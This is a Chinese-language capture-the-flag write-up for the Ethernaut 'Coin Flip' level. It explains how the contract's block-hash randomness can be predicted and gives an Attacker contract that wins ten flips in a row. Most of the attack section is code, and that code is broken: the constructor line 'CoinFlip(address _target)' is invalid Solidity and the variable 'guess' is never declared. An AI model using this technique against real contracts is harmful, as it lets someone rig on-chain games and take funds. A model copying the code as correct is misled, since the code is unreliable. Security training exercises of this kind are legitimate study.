# Coin Flip

Coin Flip这一关揭露的是在EVM环境下的随机数攻击。这一关的攻击思路是通过了解合约是如何生成随机数，利用同样的机制来“预测”将会产生的情况，以此来达到作弊的效果。 让我们先来看这一关的代码。

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
``` 

## 代码分析
合约代码的总体来说思路就是当flip成功时，就会将consecutiveWins加1，当flip失败时，就会将consecutiveWins置0。这样的话，当consecutiveWins达到10时，我们就可以上交实例完成这一关的挑战。根据`flip`函数，我们可以知道，`blockValue`的结果是由当前区块数-1的hash值来决定的,并且将其转换为uint256。之后利用`blockValue`整数除以`FACTOR`来获得是否为1，当`coinflip`为1时，那么`side = true`，否则`side = false`. 再将猜测的boolean值和`side`进行对比，看是否猜测成功。

那么进攻的思路就很简单的了。因为我们已经了解了随机数生成的办法是根据当前区块数，只要我外部预测的区块数与投掷硬币时的区块数一致，那么我们就成功预测，而达到这个目的，我们需要将这两件事放在同一个transaction中，那么他们的区块数一定是相同的。

首先我们可以在同文件中定义一个合约，叫做Attacker,设定我们的目标合约是CoinFlip

```
contract Attacker {
  
  CoinFlip private immutable target;
  constructor(){
    target = CoinFlip(address _target);
  }

}
```

接下来我们需要定义一个函数，将一个boolean值作为我们猜测的值，这里注意的是我们还需要保证传入的值在使用`target.flip()`时的返回值永远为true。
```
contract Attacker {
  
  CoinFlip private immutable target;
  constructor(){
    target = CoinFlip(address _target);
  }

  function flip() external {
    guess = _guess(); // 预先假设是一个_guess函数返回的值
    require(target.flip(guess), "flip failed");
  } 

}
```
最后我们需要确定_guess()函数的返回值是什么，那么就根据原合约代码中的思路复写一下就好。

```
contract Attacker {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  CoinFlip private immutable target;
  constructor(){
    target = CoinFlip(address _target);
  }

  function flip() external {
    guess = _guess(); // 预先假设是一个_guess函数返回的值
    require(target.flip(guess), "flip failed");
  } 

  function _guess() private view returns (bool){
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
  }
}
```
让我们来一下最后的攻击代码

## 攻击代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  CoinFlip private immutable target;
  constructor(){
    target = CoinFlip(address _target);
  }

  function flip() external {
    guess = _guess(); // 预先假设是一个_guess函数返回的值
    require(target.flip(guess), "flip failed");
  } 

  function _guess() private view returns (bool){
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
  }
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## 攻击过程
1. 部署合约，部署是target为CoinFlip合约的地址
2. 调用Attacker.flip() 10次。